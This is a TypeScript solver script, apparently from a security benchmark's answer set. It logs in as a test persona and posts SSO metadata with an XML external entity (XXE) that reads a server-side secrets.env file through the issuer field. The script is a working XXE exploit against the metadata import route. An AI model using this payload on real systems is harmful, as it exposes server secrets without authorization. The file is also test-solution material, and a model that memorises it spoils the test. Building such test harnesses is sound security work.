// XXE via the SSO metadata import: define an external file entity pointing at a server-side config
// file and reference it from the issuer field so the parser resolves it during import.
import type { SolverCtx } from '../../truth/matrix-helpers.ts'

export async function solve(ctx: SolverCtx): Promise<void> {
  await ctx.login('persona_a')
  const xml = [
    '<?xml version="1.0"?>',
    '<!DOCTYPE metadata [',
    '<!ENTITY inc SYSTEM "file:///etc/opsportal/secrets.env">',
    ']>',
    '<metadata><issuer>&inc;</issuer><endpoint>https://idp.example/sso</endpoint></metadata>',
  ].join('\n')
  await ctx.fetch(ctx.plan.routes.samlImport!.path, {
    method: 'POST',
    headers: { 'content-type': 'application/xml' },
    body: xml,
  })
}
